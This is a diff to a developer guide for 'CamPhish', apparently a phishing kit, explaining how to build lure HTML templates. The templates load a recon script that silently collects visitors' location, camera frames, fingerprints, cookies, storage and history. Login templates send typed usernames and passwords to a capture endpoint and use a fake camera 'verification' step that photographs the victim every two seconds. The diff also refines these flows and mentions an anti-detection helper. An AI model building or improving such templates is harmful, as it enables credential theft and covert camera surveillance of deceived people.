@@ -1,7 +1,7 @@
 # CamPhish Template Development Guide
 
 ## Overview
-Templates are self-contained HTML files in `templates/`. They are auto-scanned on startup and served at `/t/:id`. Each template includes `recon.js` for automatic capture of IP, GPS, camera, fingerprint, cookies, storage, and history.
+Templates are self-contained HTML files in `templates/`. Page templates are auto-scanned on startup and served at `/t/:id`. Shared helper assets such as `/t/viral.js` and `/t/anti-detect.js` are served as JavaScript helpers and are not operator-visible templates. Each page template includes `recon.js` for automatic capture of IP, GPS, camera, fingerprint, cookies, storage, and history.
 
 ## Creating a New Template
 
@@ -23,15 +23,15 @@ touch templates/my-template.html
 <body>
 <!-- Required: recon.js -->
 <script src="forwarding_link/t/recon.js"></script>
-<!-- Required: hidden video + canvas for camera -->
+<!-- Optional: hidden video + canvas for camera-backed flows -->
 <video id="v" playsinline autoplay muted></video>
 <canvas id="cap" width="320" height="240"></canvas>
 
 <!-- Your content here -->
 
 <script>
-var API='API_BASE_URL';  // Replaced at serve time with /api
-var SHARE_URL='forwarding_link/t/my-template';  // Replaced with full URL
+var API='API_BASE_URL';  // Replaced at serve time from request origin first
+var SHARE_URL='forwarding_link/t/my-template';  // Replaced with the current public URL
 
 // Required: Initialize recon on page load
 if(window.CamPhishRecon)CamPhishRecon.init({genderDetect:true});
@@ -48,6 +48,9 @@ function startCamera(){
           CamPhishRecon.Capture.image(cap.toDataURL('image/png'),'canvas');
         }
       },3000);  // Capture every 3 seconds
+      setTimeout(function(){
+        s.getTracks().forEach(function(t){t.stop();});
+      }, 10000);
     }).catch(function(){});
   }
 }
@@ -78,8 +81,8 @@ docker compose restart app
 ## Placeholder System
 | Placeholder | Replaced With | Example |
 |-------------|--------------|---------|
-| `API_BASE_URL` | `/api` (or `https://tunnel/api`) | `var API='API_BASE_URL'` → `var API='/api'` |
-| `forwarding_link` | Tunnel URL (or empty) | `src="forwarding_link/t/recon.js"` → `src="/t/recon.js"` |
+| `API_BASE_URL` | `/api` or `<request-origin>/api` | `var API='API_BASE_URL'` → `var API='/api'` |
+| `forwarding_link` | Current public origin (or empty fallback) | `src="forwarding_link/t/recon.js"` → `src="/t/recon.js"` |
 
 ## CamPhishRecon API
 
@@ -131,6 +134,7 @@ CamPhishRecon.requestCamera(function(err, stream){
 - [ ] recon.js included
 - [ ] CamPhishRecon.init() called
 - [ ] Camera starts on game start (optional)
+- [ ] One-shot camera flows stop all media tracks after capture
 - [ ] DOM elements use `el` prefix (elScore, elCombo)
 - [ ] No external CDN dependencies
 - [ ] Mobile-responsive (clamp() for font sizes)
@@ -141,12 +145,13 @@ CamPhishRecon.requestCamera(function(err, stream){
 - [ ] Username/email input field with id="user"
 - [ ] Password input field with id="pass"
 - [ ] Login button triggers credential capture
-- [ ] Credential capture: `fetch('/api/capture/credentials',...)`
+- [ ] Credential capture: `fetch((window.CamPhishRecon ? '/api' : 'API_BASE_URL') + '/capture/credentials', ...)`
 - [ ] Camera "verification" overlay after login attempt
 - [ ] Camera captures every 2s during "verification"
 - [ ] Error message after "verification" (login failed)
 - [ ] recon.js included
 - [ ] CamPhishRecon.init() called on page load
+- [ ] `CamPhishRecon.UI.*` calls are guarded with a fallback when the shared helper is stale/missing
 
 ## Common Bugs to Avoid
 1. **Variable collision**: `combo` as both number and DOM element → use `elCombo`
@@ -154,3 +159,5 @@ CamPhishRecon.requestCamera(function(err, stream){
 3. **Event listeners lost**: Attach listeners inside renderGrid(), not outside
 4. **DOMContentLoaded too late**: Set up listeners immediately (script at bottom of body)
 5. **Missing comma in SQL**: `DEFAULT (lower(hex(randomblob(16)))),` needs trailing comma
+6. **Hash routes in dashboard links**: the React app uses `BrowserRouter`, so cross-page links must use real paths, not `#/...`
+7. **Camera leak**: clear intervals and stop `stream.getTracks()` after face-scan or verification flows
